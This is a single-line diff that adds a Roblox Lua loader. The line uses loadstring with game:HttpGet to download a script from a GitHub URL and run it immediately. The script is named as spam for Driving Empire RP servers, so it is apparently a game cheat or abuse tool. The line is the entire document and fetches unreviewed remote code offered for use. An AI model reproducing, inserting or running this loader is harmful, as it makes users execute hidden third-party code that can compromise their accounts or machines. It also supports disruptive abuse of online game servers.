@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/driving-empire-rp-servers-spam5-km8got4mik776e.lua"))()
